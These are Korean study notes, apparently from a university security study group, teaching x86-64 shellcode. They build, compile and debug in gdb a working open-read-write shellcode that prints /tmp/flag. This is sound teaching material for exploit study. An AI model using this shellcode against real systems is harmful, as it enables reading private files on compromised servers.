2025 하계스터디 시스템해킹 1주차: 셸코드
==============================

1.셸코드(Shellcode) 개념
-----------------

**셸코드** 는 익스플로잇을 위해 특별히 제작된 어셈블리 코드이다.

일반적으로 셸을 획득하는 것이 목적이지만 특정 기능을 수행하는 데 사용될 수도 있다.

시스템 해킹에서 매우 중요하며 해커가 직접 작성한 셸코드를 실행할 수 있다면 원하는 어셈블리 코드를 실행시킬 수 있다.

어셈블리는 기계어와 거의 일대일 대응이므로 CPU에 원하는 명령을 직접 내릴 수 있다.

셸코드는 공격 대상 아키텍처와 운영체제에 따라 다르게 작성되며, 
공유되는 셸코드는 범용적으로 작성되어 시스템 환경을 완전히 반영하지 못할 수 있으므로 최적의 셸코드는 직접 작성하는 것이 권장된다.



2.orw 셸코드 작성
----------------------

`/tmp/flag` 파일 읽고 출력하는 셸코드는 다음과 같다.

```c
char buf[0x30];
int fd = open("/tmp/flag", RD_ONLY, NULL);
read(fd, buf, 0x30);
write(1, buf, 0x30);
```


**시스템 콜(Syscall) 테이블** 은 

  * `open`: `rax` 0x02, `arg0(rdi)` const char \*filename, `arg1(rsi)` int flags, `arg2(rdx)` umode\_t mode
  * `read`: `rax` 0x00, `arg0(rdi)` unsigned int fd, `arg1(rsi)` char \*buf, `arg2(rdx)` size\_t count
  * `write`: `rax` 0x01, `arg0(rdi)` unsigned int fd, `arg1(rsi)` const char \*buf, `arg2(rdx)` size\_t count

----------------------------------


먼저  **`open("/tmp/flag", O_RDONLY, NULL)`** 부분 구현을 보면

* **`/tmp/flag` 문자열 메모리에 위치시키기:**
      * `/tmp/flag`의 리틀 엔디언 형태인 `0x67616c662f706d742f`를 `push` 명령을 통해 스택에 넣음
  (8바이트 단위로 push 가능하므로 `0x67`을 먼저 push 후 전체 주소를 push)
      * `rdt`가 이를 가리키도록 `rsp`를 `rdi`로 옮김
  * **`O_RDONLY` 설정:**
      * `O_RDONLY`는 0이므로 `rsi`를 0으로 설정 (`#define O_RDONLY 0` 참조)
  * **`mode` 설정:**
      * 파일을 읽을 때 `mode`는 의미가 없으므로 `rdx`를 0으로 설정
  * **`rax` 설정 및 `syscall` 호출:**
      * `open` 시스템 콜을 호출하기 위해 `rax`를 2로 설정

        
**`open` 구현 어셈블리 코드:**

```assembly
push 0x67
mov rax, 0x616c662f706d742f
push rax
mov rdi, rsp       ; rdi = "/tmp/flag"
xor rsi, rsi       ; rsi = 0 ; O_RDONLY
xor rdx, rdx       ; rdx = 0
mov rax, 2         ; rax = 2 ; syscall_open
syscall            ; open("/tmp/flag", 0, 0)
```

-----------------------------

**`read(fd, buf, 0x30)`** 구현 부분을 보면

  * **`fd` 설정:**
      * `open` 시스템 콜의 반환 값(파일 디스크립터)은 `rax`에 저장되므로 `rax`에 저장된 `fd` 값을 `rdi`에 대입
  * **`buf` 설정:**
      * `rs`는 파일에서 읽어온 데이터를 저장할 주소를 가리킴.
        스택 포인터 `rsp`에서 `0x30`만큼 감소시킨 주소를 `rsi`에 대입하여 버퍼로 사용
  * **`len` 설정:**
      * 읽어올 데이터의 길이인 `0x30`을 `rdx`에 설정
  * **`rax` 설정 및 `syscall` 호출:**
      * `read` 시스템 콜을 호출하기 위해 `rax`를 0으로 설정


**`read` 구현 어셈블리 코드:**

```assembly
mov rdi, rax       ; rdi = fd
sub rsi, 0x30      ; rsi = rsp-0x30 ; buf
mov rdx, 0x30      ; rdx = 0x30 ; len
mov rax, 0         ; rax = 0 ; syscall_read
syscall            ; read(fd, buf, 0x30)
```

--------------------------------------

**`write(1, buf, 0x30)`** 부분 구현을 보면 

  * **`fd` 설정:** 출력을 `stdout` (표준 출력)으로 보낼 것이므로 `rdi`를 1로 설정 (`fd = stdout`)
  * **`buf`와 `len` 설정:** `read` 시스템 콜에서 사용했던 `rsi` (버퍼 주소)와 `rdx` (길이) 값을 그대로 사용
  * **`rax` 설정 및 `syscall` 호출:** `write` 시스템 콜을 호출하기 위해 `rax`를 1로 설정


**`write` 구현 어셈블리 코드:**

```assembly
mov rdi, 1         ; rdi = 1 ; fd = stdout
mov rax, 0x1       ; rax = 1 ; syscall_write
syscall            ; write(fd, buf, 0x30)
```

--------------------------------


**`open`, `read`, `write` 시스템 콜 구현 코드를 모두 합친 최종 어셈블리 코드** 는 

```assembly
; Name: orw.S
push 0x67
mov rax, 0x616c662f706d742f
push rax
mov rdi, rsp       ; rdi = "/tmp/flag"
xor rsi, rsi       ; rsi = 0 ; RD_ONLY
xor rdx, rdx       ; rdx = 0
mov rax, 2         ; rax = 2 ; syscall_open
syscall            ; open("/tmp/flag", RD_ONLY, NULL)

mov rdi, rax       ; rdi = fd
mov rsi, rsp
sub rsi, 0x30      ; rsi = rsp-0x30 ; buf
mov rdx, 0x30      ; rdx = 0x30 ; len
mov rax, 0         ; rax = 0 ; syscall_read
syscall            ; read(fd, buf, 0x30)

mov rdi, 1         ; rdi = 1 ; fd = stdout
mov rax, 0x1       ; rax = 1 ; syscall_write
syscall            ; write(fd, buf, 0x30)
```



3.orw 셸코드 컴파일 및 실행
-------------------------

* **실행 가능한 파일 형식:** 운영체제는 실행 가능한 파일의 형식을 정의하며
  윈도우의 PE, 리눅스의 ELF가 대표적이다. ELF는 헤더와 기타 데이터(기계어 코드 포함)로 구성된다.
  * `orw.S`는 순수 아스키 어셈블리 코드이므로 이 자체로는 리눅스에서 실행될 수 없으며,
    CPU가 이해할 수 있는 ELF 형식으로 변환해야 한다.
  * **컴파일 방법:** 어셈블리 코드를 ELF 형태로 변환하기 위해 gcc 컴파일러를 사용한다.
    셸코드를 실행할 수 있는 "스켈레톤 코드"라고 불리는 C 언어 파일에 셸코드를 삽입하여 컴파일한다.

---------------------------------------

### **스켈레톤 코드(`sh-skeleton.c`)**

`__asm__` 블록을 사용하여 인라인 어셈블리 형태로 셸코드를 포함하고 
main 함수에서 `run_sh()` 함수를 호출하여 셸코드를 실행한다. 
스켈레톤 코드에는 `exit(0)` 시스템 콜 (`xor rdi, rdi; mov rax, 0x3c; syscall`)이 포함되어 있다.

```c
// File name: sh-skeleton.c
// Compile Option: gcc -o sh-skeleton sh-skeleton.c -masm=intel
__asm__(
    ".global run_sh\n"
    "run_sh:\n"
    "Input your shellcode here.\n" // 여기에 실제 셸코드가 들어감
    "Each line of your shellcode should be\n"
    "seperated by '\\n\\n'\n"
    "xor rdi, rdi\n"
    "mov rax, 0x3c\n" // rax = sys_exit
    "syscall\n"      // # exit(0)
);
void run_sh();
int main() { run_sh(); }
```

-------------------------------------------------------------

![image](https://github.com/user-attachments/assets/07c5b2dd-6447-40ac-9e13-f8093e467029)

실제 `orw.S`의 내용을 스켈레톤 코드의 `__asm__` 블록에 삽입해 완성했다. 
마지막에 `exit(0)` 시스템 콜이 포함되어 셸코드 실행 후 정상 종료된다.

![image](https://github.com/user-attachments/assets/7431f2be-1c96-45ae-a2a1-a6a27c6fb47c)

 * 셸코드가 `/tmp/flag` 파일을 성공적으로 읽고 출력하는지 확인하기 위해 먼저 `/tmp/flag` 파일을 생성한다. 
 * gcc -o orw orw.c -masm=intel 명령어로 orw.c를 컴파일한 후 ./orw 로 실행한다.
 * 실행 결과로 `/tmp/flag` 파일에 저장된 문자열(`flag{this_is_open_read_write_shellcode!}`)이 출력되는 것을 확인할 수 있다.
 * 만약 공격 대상 시스템에서 이 셸코드를 실행할 수 있다면 서버의 주요 정보를 유출할 수 있을 것이다.



4.orw 셸코드 디버깅
-----------------------

![image](https://github.com/user-attachments/assets/c66c0123-4a0b-4345-b212-b1978aaca9f6)

![image](https://github.com/user-attachments/assets/c9820b6b-73a9-4be4-ba00-c015144764ad)

![image](https://github.com/user-attachments/assets/8f56228e-3efd-4a8d-a597-4bf35e9a7c62)


* **디버거 실행 및 브레이크포인트 설정:**
    * `gdb orw -q` 명령으로 `gdb`를 실행
    * `b *run_sh` 명령으로 `run_sh` 함수의 시작 부분에 브레이크포인트를 설정
    * `r` 명령으로 프로그램을 실행하고, `run_sh` 시작 지점에서 멈춘 것을 확인
 
-------------------------------------------------------

### **`open` 시스템 콜 분석 (`run_sh+29` 브레이크포인트)**


![image](https://github.com/user-attachments/assets/38f5bc66-990a-46b8-a47b-152cedac0d20)

![image](https://github.com/user-attachments/assets/fb44a687-32f0-48e4-9303-40562c66dd63)

![image](https://github.com/user-attachments/assets/e107be45-58ca-4885-aec5-a3c61c26e35e)

![image](https://github.com/user-attachments/assets/5473cd1a-62b9-4920-bc69-dfc2696d9747)

![image](https://github.com/user-attachments/assets/be2a8211-67a5-4046-9f11-4bf8cfde92a1)


* `b *run_sh+29` 에 브레이크포인트를 설정하고 `c` 명령으로 진행
* `syscall` 실행 직전의 레지스터 상태를 확인
* `RAX`는 2 (`sys_open`)이고, `RDI`는 `0x7fffffffdd68`로 `/tmp/flag` 문자열의 주소를 가리키고 `RSI`는 0 (`O_RDONLY`)
* `ni` 명령으로 `syscall`을 실행하면 `RAX`에 파일 디스크립터(`3`)가 저장된 것을 확인할 수 있음. 이는 `/tmp/flag`의 `fd`

----------------------------------------

### **`read` 시스템 콜 분석 (`run_sh+55` 브레이크포인트)**

![image](https://github.com/user-attachments/assets/f02e43fb-f707-4ecb-bef9-d50ae2fa056f)

![image](https://github.com/user-attachments/assets/9e27e948-c8cc-42b4-b654-bea167471d31)

![image](https://github.com/user-attachments/assets/0bd0fd93-bb65-42d9-b290-4711b3785fcd)

![image](https://github.com/user-attachments/assets/78eb3e63-2fa6-47a3-9994-bfdfd775f321)



 * `b *run_sh+55` 에 브레이크포인트를 설정하고 `c` 명령으로 진행
 * `syscall` 실행 직전의 레지스터 상태를 확인
 * `RAX`는 0 (`sys_read`)이고, `RDI`는 `3` (이전 `open`에서 얻은 `fd`)이며, `RSI`는 `0x7fffffffdd38` (버퍼 주소)이고, `RDX`는 `0x30` (읽을 바이트 수)
 * `ni` 명령으로 `syscall`을 실행하면 `/tmp/flag`의 데이터 `0x30`바이트가 `0x7fffffffdd38`에 저장된 것을 확인할 수 있음 
 * `x/s 0x7fffffffdd38` 명령으로 해당 주소의 내용을 확인하면 `flag{this_is_open_read_write_shellcode!}` 문자열이 저장되어 있음을 알 수 있음


--------------------------------

### **`write` 시스템 콜 분석 (`run_sh+70` 브레이크포인트)**

![image](https://github.com/user-attachments/assets/45538ba1-62f0-4207-b2ce-881a86442920)

![image](https://github.com/user-attachments/assets/5a8d91b3-1d00-475f-bc84-d17aecbb519a)

 * `b *run_sh+70` 에 브레이크포인트를 설정하고 `c` 명령으로 진행
 * `syscall` 실행 직전의 레지스터 상태를 확인
 * `RAX`는 1 (`sys_write`)이고, `RDI`는 1 (`stdout`), `RSI`는 `0x7fffffffdd38` (버퍼 주소), `RDX`는 `0x30` (쓸 바이트 수)
 * `n` 또는 `ni` 명령으로 `syscall`을 실행하면 `0x7fffffffdd38`에 저장된 문자열이 출력되는 것을 확인

------------------------------------------------

### **참고. 파일 디스크립터(File Descriptor) 개념**

  * 파일 디스크립터는 유닉스 계열 운영체제에서 파일 접근을 위한 가상의 접근 제어자
  * 프로세스마다 고유의 서술자 테이블을 갖고 있으며, 서술자 값은 0번(`STDIN`), 1번(`STDOUT`), 2번(`STDERR`)부터 순차적으로 할당
  * `open`과 같은 함수를 통해 파일과 프로세스를 연결하면, 기본적으로 2번 이후의 번호로 새로운 `fd`가 할당되며 프로세스는 이 `fd`를 이용하여 파일에 접근



### **참고. 초기화되지 않은 메모리 사용 (Use of Uninitialized Memory)**

* `/tmp/flag` 파일의 내용 외에 알 수 없는 문자가 출력되는 경우가 발생할 수 있음. 초기화되지 않은 메모리 영역 사용으로 인한 것이다.
* 스택에서 함수들은 스택 프레임을 할당하고 종료 시 해제한다. 이때 해제된 메모리 영역을 0으로 초기화하지 않고 단순히 `rsp`나 `rbp`만 조작하여 해제된 것처럼 보이게 한다.
* 즉 함수가 해제된 후에도 이전 스택 프레임의 데이터는 여전히 할당된 스택 프레임에 남아있다. 이를 "쓰레기 값(garbage data)"이라고 한다.
* 프로세스가 쓰레기 값을 읽으면 예상치 못한 동작을 하거나 해커에게 의도치 않게 중요한 정보를 노출할 수 있다.
* 따라서 이러한 위험으로부터 안전한 프로그램을 작성하려면 스택이나 힙을 사용할 때 항상 적절한 초기화가 필요하다.







